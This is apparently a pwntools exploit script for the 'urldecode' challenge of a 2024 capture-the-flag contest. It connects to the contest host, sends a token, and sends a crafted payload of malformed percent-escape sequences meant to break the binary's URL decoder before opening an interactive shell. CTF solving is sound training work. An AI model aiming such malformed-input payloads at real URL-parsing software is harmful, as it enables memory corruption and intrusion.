from pwn import *
from icecream import ic

# Set up pwntools for the correct architecture
exe = "./urldecode"
# libc = ELF("")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("urldecode.q.2024.ugractf.ru", 9279 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

sl(b"14wgrpkgztt8ycyz")
lp = list("0123456789abcdef")

pay = b""
for i in range(16):
    pay += f"%-{lp[i]}".encode()

for i in range(16):
    pay += f"%.{lp[i]}".encode()

for i in range(16):
    pay += f"%/{lp[i]}".encode()

for i in range(16):
    pay += f"%/{lp[i]}".encode()

sl(pay)

r.interactive()
